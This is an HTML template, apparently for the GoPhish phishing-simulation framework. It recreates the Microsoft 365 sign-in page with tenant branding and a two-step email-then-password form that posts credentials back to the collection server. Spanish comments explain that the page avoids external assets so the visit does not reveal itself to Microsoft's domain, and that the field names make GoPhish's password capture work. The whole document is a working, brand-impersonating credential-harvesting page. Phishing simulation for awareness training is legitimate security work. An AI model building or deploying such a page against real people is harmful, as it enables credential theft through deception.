<!doctype html>
<html lang="{{idioma}}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>{{tituloPagina}}</title>
<style>
  /* Recreación del inicio de sesión de Microsoft 365 con branding de tenant.
     Escrita a mano en lugar de volcar el sitio real: pesa 40 veces menos,
     no arrastra assets externos que delaten la visita al dominio original
     y se puede mantener. */

  * { box-sizing: border-box; }

  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px 16px;
    font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, system-ui, sans-serif;
    font-size: 15px;
    color: #1b1b1b;
    background-color: #f3f2f1;
    background-image:
      radial-gradient(circle at 12% 18%, {{color}}1f 0%, transparent 45%),
      radial-gradient(circle at 88% 82%, {{color}}14 0%, transparent 42%);
  }

  .tarjeta {
    width: 100%;
    max-width: 440px;
    padding: 44px;
    background: #ffffff;
    box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
  }

  .marca-tenant {
    margin-bottom: 16px;
    min-height: 24px;
  }
  .marca-tenant img { max-width: 150px; max-height: 42px; display: block; }

  /* Logotipo de Microsoft dibujado con CSS: sin peticiones a servidores ajenos. */
  .ms { display: flex; align-items: center; gap: 7px; margin-bottom: 16px; }
  .ms-cuadros {
    display: grid;
    grid-template-columns: 9px 9px;
    grid-template-rows: 9px 9px;
    gap: 2px;
  }
  .ms-cuadros i { display: block; }
  .ms-cuadros i:nth-child(1) { background: #f25022; }
  .ms-cuadros i:nth-child(2) { background: #7fba00; }
  .ms-cuadros i:nth-child(3) { background: #00a4ef; }
  .ms-cuadros i:nth-child(4) { background: #ffb900; }
  .ms-texto { font-size: 15px; font-weight: 600; color: #5e5e5e; letter-spacing: -.01em; }

  h1 { margin: 0 0 12px; font-size: 24px; font-weight: 600; line-height: 28px; }

  .aviso {
    margin: 0 0 14px;
    font-size: 13px;
    line-height: 18px;
    color: #a80000;
  }
  .aviso:empty { display: none; }

  .identidad {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 16px;
    font-size: 15px;
  }
  .volver {
    border: 0;
    background: none;
    padding: 0;
    cursor: pointer;
    color: #1b1b1b;
    font-size: 17px;
    line-height: 1;
  }

  .campo {
    width: 100%;
    padding: 6px 0 8px;
    font-family: inherit;
    font-size: 15px;
    color: #1b1b1b;
    background: transparent;
    border: 0;
    border-bottom: 1px solid #666666;
    outline: none;
  }
  .campo::placeholder { color: #666666; }
  .campo:focus { border-bottom: 2px solid {{color}}; padding-bottom: 7px; }

  .error {
    margin: 6px 0 0;
    font-size: 13px;
    line-height: 17px;
    color: #a80000;
  }

  .enlaces { margin: 16px 0 0; font-size: 13px; }
  .enlaces a {
    display: block;
    margin-bottom: 10px;
    color: {{color}};
    text-decoration: none;
  }
  .enlaces a:hover { text-decoration: underline; }

  .acciones { display: flex; justify-content: flex-end; margin-top: 26px; }

  .boton {
    min-width: 108px;
    padding: 7px 12px;
    font-family: inherit;
    font-size: 15px;
    color: {{colorTexto}};
    background: {{color}};
    border: 1px solid {{color}};
    cursor: pointer;
  }
  .boton:hover { background: {{colorOscuro}}; border-color: {{colorOscuro}}; }

  .pie {
    display: flex;
    justify-content: flex-end;
    gap: 18px;
    max-width: 440px;
    width: 100%;
    margin: 0 auto;
    padding: 10px 4px 0;
    font-size: 12px;
    color: #747474;
  }

  .envoltorio { width: 100%; max-width: 440px; }

  .paso[hidden] { display: none; }

  @media (max-width: 480px) {
    body { padding: 0; background-image: none; background: #ffffff; }
    .tarjeta { max-width: none; box-shadow: none; padding: 26px 22px; min-height: 100vh; }
    .pie { display: none; }
  }
</style>
</head>
<body>

<div class="envoltorio">
  <div class="tarjeta">

    <div class="marca-tenant">{{logoHtml}}</div>

    <div class="ms" aria-hidden="true"><svg style="display:block;height:26px;width:auto" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 337.6 72">

</svg>
</div>

    <!--
      Un único formulario en dos pasos. Los campos se llaman exactamente
      "email" y "password": así es como GoPhish identifica la contraseña
      para poder descartarla cuando "Capture Passwords" está desmarcada.
      Si renombras estos campos, esa casilla deja de funcionar.
    -->
    <form id="formulario" method="post" action="" autocomplete="off">

      <!-- Paso 1: identificador -->
      <div class="paso" id="paso-email">
        <h1>{{tituloPaso1}}</h1>
        <!--@bloque:aviso-sesion @senal:urgencia-->
        <p class="aviso">{{aviso}}</p>
        <!--@/bloque-->
        <input class="campo" type="email" id="email" name="email"
               placeholder="{{phEmail}}" required autofocus>
        <p class="error" id="error-email" hidden>{{errorEmail}}</p>
        <div class="enlaces">
          <!--@bloque:enlaces-ayuda @opcional-->
          <a href="#">{{enlaceCrearCuenta}}</a>
          <a href="#">{{enlaceSinAcceso}}</a>
          <!--@/bloque-->
        </div>
        <div class="acciones">
          <button class="boton" type="button" id="btn-siguiente">{{btnSiguiente}}</button>
        </div>
      </div>

      <!-- Paso 2: contraseña -->
      <div class="paso" id="paso-password" hidden>
        <div class="identidad">
          <button class="volver" type="button" id="btn-volver" aria-label="{{btnVolver}}">&#8592;</button>
          <span id="eco-email"></span>
        </div>
        <h1>{{tituloPaso2}}</h1>
        <input class="campo" type="password" id="password" name="password"
               placeholder="{{phPassword}}" required>
        <div class="enlaces">
          <a href="#">{{enlaceOlvido}}</a>
        </div>
        <div class="acciones">
          <button class="boton" type="submit">{{btnEntrar}}</button>
        </div>
      </div>

    </form>
  </div>

  <div class="pie">
    <!--@bloque:pie-legal @senal:!incoherencia-marca-->
    <span>{{enlaceCondiciones}}</span>
    <span>{{enlacePrivacidad}}</span>
    <!--@/bloque-->
    <span>&#8943;</span>
  </div>
</div>

<script>
  // Paso 1 -> paso 2. Sin esto la página seguiría funcionando: bastaría con
  // que el usuario rellenase el correo y pulsase Intro para enviar el formulario.
  (function () {
    var email = document.getElementById('email');
    var errorEmail = document.getElementById('error-email');
    var pasoEmail = document.getElementById('paso-email');
    var pasoPassword = document.getElementById('paso-password');
    var eco = document.getElementById('eco-email');

    function avanzar() {
      if (!email.value || email.value.indexOf('@') === -1) {
        errorEmail.hidden = false;
        email.focus();
        return;
      }
      errorEmail.hidden = true;
      eco.textContent = email.value;
      pasoEmail.hidden = true;
      pasoPassword.hidden = false;
      document.getElementById('password').focus();
    }

    document.getElementById('btn-siguiente').addEventListener('click', avanzar);

    email.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') { e.preventDefault(); avanzar(); }
    });

    document.getElementById('btn-volver').addEventListener('click', function () {
      pasoPassword.hidden = true;
      pasoEmail.hidden = false;
      email.focus();
    });
  })();
</script>

</body>
</html>
